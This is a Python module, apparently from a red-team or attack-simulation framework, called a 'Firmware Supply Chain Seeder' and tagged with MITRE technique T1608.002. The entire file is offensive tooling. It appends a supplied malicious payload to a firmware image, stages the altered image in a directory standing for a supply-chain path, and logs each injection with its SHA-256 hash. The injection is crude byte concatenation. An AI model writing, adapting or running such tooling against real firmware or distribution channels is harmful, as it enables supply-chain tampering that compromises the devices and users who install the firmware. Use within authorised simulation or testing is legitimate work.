# modules/attacks/firmware_supply_chain_seeder.py

import os
import argparse
import shutil
import json
from datetime import datetime
from hashlib import sha256

LOG_PATH = "results/supply_chain_seed_logs.json"
MITRE_TTP = "T1608.002"

def log_seeding(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def inject_payload(firmware_path, payload_path, output_path):
    with open(firmware_path, "rb") as base, open(payload_path, "rb") as mal:
        original = base.read()
        malicious = mal.read()

    stitched = original + b"\n\n<!-- PAYLOAD INJECTION -->\n" + malicious

    with open(output_path, "wb") as out:
        out.write(stitched)

    return sha256(stitched).hexdigest()

def seed_to_target(firmware_path, target_dir):
    os.makedirs(target_dir, exist_ok=True)
    dst = os.path.join(target_dir, os.path.basename(firmware_path))
    shutil.copy(firmware_path, dst)
    return dst

def execute(firmware, payload, staging_dir):
    print(f"[+] Injecting payload into firmware image...")
    modified_fw = "results/firmware_staged.img"
    hash_val = inject_payload(firmware, payload, modified_fw)

    print(f"[+] Seeding modified firmware to staging path: {staging_dir}")
    deployed_path = seed_to_target(modified_fw, staging_dir)

    log_seeding({
        "timestamp": datetime.utcnow().isoformat(),
        "original_firmware": firmware,
        "payload_injected": payload,
        "staged_output": deployed_path,
        "sha256": hash_val,
        "ttp": MITRE_TTP
    })

    print(f"[✓] Firmware seeded to {deployed_path}")
    print(f"[✓] SHA256: {hash_val}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Firmware Supply Chain Seeder")
    parser.add_argument("--firmware", required=True, help="Original firmware image to modify")
    parser.add_argument("--payload", required=True, help="Malicious binary or script to inject")
    parser.add_argument("--stage-dir", required=True, help="Directory representing target supply chain path")

    args = parser.parse_args()
    execute(args.firmware, args.payload, args.stage_dir)
